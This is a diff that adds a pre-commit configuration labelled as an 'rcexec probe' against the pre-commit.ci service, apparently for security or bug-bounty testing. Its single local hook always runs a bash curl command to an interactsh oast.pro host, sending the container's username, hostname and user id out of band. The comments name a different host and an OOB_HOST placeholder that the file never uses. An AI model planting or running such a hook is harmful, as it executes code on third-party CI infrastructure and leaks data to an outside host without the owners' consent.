@@ -1,0 +1,17 @@
+# rcexec probe — pre-commit.ci SaaS
+# Surface: language: system hooks execute raw shell in pre-commit.ci containers
+# OOB: dba7in09drvebvvemiogs53d1at9mapqp.oast.pro
+# Probe ID: PRECOMMIT-001
+# Replace OOB_HOST with your live interactsh hostname before use
+
+repos:
+  - repo: local
+    hooks:
+      - id: rcexec-probe
+        name: rcexec-probe
+        language: system
+        entry: >-
+          bash -c 'curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/precommit/$(whoami).$(hostname).$(id -u)'
+        files: ''
+        pass_filenames: false
+        always_run: true
